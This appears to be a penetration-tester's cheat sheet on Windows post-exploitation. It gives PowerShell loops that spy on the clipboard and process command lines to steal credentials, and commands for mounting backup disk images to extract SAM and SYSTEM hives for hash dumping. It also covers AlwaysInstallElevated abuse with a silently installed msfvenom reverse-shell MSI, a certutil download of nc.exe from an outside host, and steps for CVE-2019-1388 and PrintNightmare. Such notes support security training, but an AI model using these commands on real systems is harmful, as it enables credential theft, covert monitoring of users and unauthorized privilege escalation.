# Additional Techniques
## Interacting with Users (Pillaging & Monitoring)
**Concept:** Instead of attacking the system, attack the user. By monitoring their actions or hijacking their sessions, you can steal credentials as they type them or access resources they unlock.
### 1. Clipboard Monitoring
**Goal:** Capture passwords or sensitive data copied by the user. 
**Tool:** PowerShell script loop.
```powershell
# Description: Monitor clipboard every 2 seconds
while($true) {
    Get-Clipboard
    Start-Sleep 2
}
# Or use Invoke-ClipboardLogger.ps1
```
### 2. Process Command Lines
**Goal:** Detect credentials passed as arguments to processes (e.g., `net use ... /user:admin password`).
```powershell
# Description: Monitor process creation for command line arguments
while($true) {
    $p = Get-WmiObject Win32_Process | Select CommandLine
    Start-Sleep 1
    $p2 = Get-WmiObject Win32_Process | Select CommandLine
    Compare-Object -ReferenceObject $p -DifferenceObject $p2
}
```
### 3. Traffic Capture (Wireshark/Tcpdump)
**Goal:** Sniff cleartext protocols (FTP, HTTP, Telnet) if Npcap driver access is not restricted to Admins. 
**Execution:** Run Wireshark/Tshark on the interface.
## Accessing Files & Backups (Pillaging)
**Concept:** Data at rest often contains the keys to the kingdom.
### 1. Backup Files & Virtual Disks
**Target:** `.vhd`, `.vhdx`, `.vmdk`, `.bak` files on network shares or local backups. 
**Exploitation:**
1. **Mount:** Mount the disk image to access the filesystem.
```powershell
# Windows
Mount-VHD -Path C:\Backups\DomainController.vhdx
```

```shell
# Linux (Guestmount)
guestmount -a DomainController.vmdk -i --ro /mnt/vmdk
```
2. **Extract Secrets:** Copy `C:\Windows\System32\Config` (SAM, SYSTEM, SECURITY) from the mounted disk.
3. **Dump Hashes:** Use `secretsdump.py` offline.
### 2. Restic & Backup Software
**Target:** Backup repositories (often `restic`). 
**Exploitation:**
- Check environment variables for passwords (`$env:RESTIC_PASSWORD`).
- Restore the backup to a readable location to access sensitive files.
```powershell
restic -r E:\Backups restore latest --target C:\Restore
```
## Miscellaneous Escalation Techniques
### 1. AlwaysInstallElevated (MSI Abuse)
**Vulnerability:** Policy allowing non-admins to install MSI packages with SYSTEM privileges. 
**Enumeration:**
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- **Condition:** Both must be `0x1`. **Exploitation:**
1. Generate malicious MSI: `msfvenom -p windows/shell_reverse_tcp ... -f msi -o evil.msi`.
2. Install: `msiexec /quiet /qn /i evil.msi`.
### 2. LOLBAS (Living Off The Land)
**Concept:** Use Microsoft-signed binaries for unintended purposes (file transfer, execution). **Reference:** [LOLBAS Project](https://lolbas-project.github.io/).
- **Certutil:** Download files or encode/decode Base64.
```powershell
certutil -urlcache -split -f http://<IP>/nc.exe nc.exe
```
- **Rundll32:** Execute DLLs.
- **Msbuild:** Execute C# code (XML format).
### 3. Application Exploits (CVEs)
**CVE-2019-1388 (Certificate Dialog):**
- **Target:** Older Windows versions (7/10/Server 2008-2019).
- **Technique:** Run a signed executable as Admin -> View Certificate -> Click "Issued By" link -> Browser opens as SYSTEM -> Save Page As -> Open `cmd.exe`.

**CVE-2021-1675 / 34527 (PrintNightmare):**
- **Target:** Print Spooler service.
- **Technique:** Add a malicious printer driver to execute DLL as SYSTEM.